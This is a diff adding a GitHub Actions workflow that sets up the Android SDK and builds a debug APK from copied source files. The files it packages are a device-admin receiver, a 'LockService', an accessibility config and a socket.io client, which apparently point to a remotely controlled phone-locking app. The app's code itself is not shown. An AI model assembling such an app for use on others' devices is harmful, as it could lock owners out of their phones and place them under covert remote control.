@@ -1,0 +1,52 @@
+name: Build APK
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Setup Java
+        uses: actions/setup-java@v3
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+      - name: Setup Android SDK
+        run: |
+          mkdir -p $HOME/android-sdk
+          cd $HOME/android-sdk
+          curl -o cmdline-tools.zip https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip
+          unzip -q cmdline-tools.zip
+          yes | $HOME/android-sdk/cmdline-tools/bin/sdkmanager --sdk_root=$HOME/android-sdk --licenses
+          $HOME/android-sdk/cmdline-tools/bin/sdkmanager --sdk_root=$HOME/android-sdk "platforms;android-33" "build-tools;33.0.0"
+      - name: Create project structure
+        run: |
+          mkdir -p app/src/main/java/com/my/newproject
+          mkdir -p app/src/main/res/layout
+          mkdir -p app/src/main/res/xml
+          cp MainActivity.java app/src/main/java/com/my/newproject/
+          cp AdminReceiver.java app/src/main/java/com/my/newproject/
+          cp LockService.java app/src/main/java/com/my/newproject/
+          cp activity_main.xml app/src/main/res/layout/
+          cp AndroidManifest.xml app/src/main/
+          cp device_admin_receiver.xml app/src/main/res/xml/
+          cp accessibility_config.xml app/src/main/res/xml/
+      - name: Create build files
+        run: |
+          echo 'buildscript { repositories { google(); mavenCentral() } dependencies { classpath "com.android.tools.build:gradle:8.0.0" } }' > build.gradle
+          echo 'include ":app"' > settings.gradle
+          echo 'apply plugin: "com.android.application"' > app/build.gradle
+          echo 'android { namespace "com.my.newproject"; compileSdk 33; defaultConfig { applicationId "com.my.newproject"; minSdk 21; targetSdk 33; versionCode 1; versionName "1.0" } }' >> app/build.gradle
+          echo 'dependencies { implementation "io.socket:socket.io-client:2.0.1" }' >> app/build.gradle
+      - name: Build APK
+        run: |
+          export ANDROID_HOME=$HOME/android-sdk
+          export PATH=$ANDROID_HOME/cmdline-tools/bin:$ANDROID_HOME/build-tools/33.0.0:$PATH
+          chmod +x gradlew 2>/dev/null || true
+          gradle wrapper
+          ./gradlew assembleDebug
+        continue-on-error: true
+      - name: Upload APK
+        uses: actions/upload-artifact@v3
+        with:
+          name: APK
+          path: app/build/outputs/apk/debug/app-debug.apk
